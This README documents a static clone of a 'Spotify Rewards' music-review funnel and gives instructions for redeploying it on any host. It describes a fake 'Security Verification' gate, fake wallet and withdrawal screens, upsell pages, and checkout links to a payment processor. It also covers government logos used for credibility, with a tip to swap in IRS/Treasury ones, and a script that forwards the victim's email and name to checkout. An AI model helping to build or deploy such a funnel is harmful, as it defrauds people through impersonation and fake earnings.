# usystemip.com — static clone (English)

Full offline/static clone of **https://usystemip.com** (the "Music & App Reviews" /
Spotify Rewards funnel). 100% static: no backend, no database.
State lives in `localStorage`, so it runs on any static host.

> **Deploying to Lovable?** See **[LOVABLE.md](LOVABLE.md)** for the step-by-step
> (import the ZIP, publish, custom domain).

## How it works

1. `/` → fake **Security Verification** gate (`pressel.js`). Click "I'm not a robot",
   wait ~2s, answer `1 + 1 = 2`, then it redirects to `/inicio/`.
2. `/inicio/` → the real SPA (`app.js`), a vanilla-JS ES-module app with
   `history.pushState` routing.

## Structure

```
index.html            verification gate (entry point)
pressel.css / pressel.js
inicio/index.html     SPA shell (the app boots from here)
app.js                SPA: routing, screens, state
style.css             all styles
theme.js music.js payments.js i18n.js model.js effects.js front-checkout.js
assets/               favicon, cash-register.wav, social-proof images, logos
assets/music/         full songs (mp3) + covers used by the built-in player
back-redirect/        standalone "Spotify Rewards" page (checkout $058795)
back-redirect-2/      standalone "Spotify Rewards" page (checkout $e8f6e1)
tasks-app/ review/ resgatar/ wallet/ confirmar-saque/ historico/ profile/ faq/
up1/ upsell-1..5/     one index.html copy of the SPA shell each
404.html              SPA shell (fallback for unknown paths)
.htaccess _redirects vercel.json robots.txt
```

Every SPA route has its own physical folder, so **deep links and refreshes work on
any host with zero configuration**. The `.htaccess` / `_redirects` / `vercel.json`
files are optional extras that add a fallback for unknown paths.

## Routes

`/inicio` `/tasks-app` `/review` `/resgatar` `/wallet` `/confirmar-saque`
`/historico` `/profile` `/faq` `/up1` `/upsell-1..5` `/back-redirect/` `/back-redirect-2/`

## Deploy

Upload the whole folder to any static host (Hostinger, Netlify, Vercel, GitHub
Pages, S3, Cloudflare Pages). Nothing else to configure.

Local preview:

```bash
python -m http.server 8080
# then open http://localhost:8080/
```

## Notes

- Language defaults to **en-US**; the built-in EN / PT-BR toggle is kept.
- Government logos in `assets/` are the Brazilian gov.br / Receita Federal ones
  (swap for IRS/Treasury if you want).
- Checkout buttons point to the original `pay.pag3b.com` links
  (`ae3402` front, `058795` / `e8f6e1` back-redirect). Change them in
  `front-checkout.js` and the two `back-redirect*/index.html` files.
- **No tracking pixels.** The TikTok pixel and the Utmify scripts were removed.
  What is left is a tiny inline "UTM passthrough" at the top of `app.js` (plus a
  copy in the gate `index.html` and in both `back-redirect*/index.html`): it
  stores every query param (`email`, `name`, `utm_*`, click ids) in
  `localStorage` and puts it back on the URL if it is ever missing, so the funnel
  always forwards the lead's email/name to the checkout and the checkout opens
  with the email already filled in. `withParams()` in `app.js` appends
  `location.search` to the checkout link.
- **Music player is the official Spotify embed iframe**, exactly like the live
  site, so the review step is pixel-identical. The "Open in Spotify" link is kept.
  The iframe needs internet and plays Spotify's 30s preview.
  The embed URL is byte-for-byte the same as the live site, including the query
  string, so playback starts at the same point as the original:
  `https://open.spotify.com/embed/track/<id>?utm_source=organic&theme=0&utm_campaign=&utm_medium=&utm_content=&utm_term=`
  Do not change those params (e.g. to `utm_source=generator`) or the embed can
  behave differently. Edit the URL in `music.js` (`renderSingleTrack`).
- `assets/music/` (mp3 + covers, ~250 MB) is **optional**: it is only used if you
  switch back to the built-in local player. Delete the folder to shrink the
  upload, or keep it as a fallback.
- Dev-only leftovers in the root (`*.py`, `live_*.js`, `emb.html`, `previews/`,
  `full/`, `wav/`) are not needed for hosting and can be deleted.
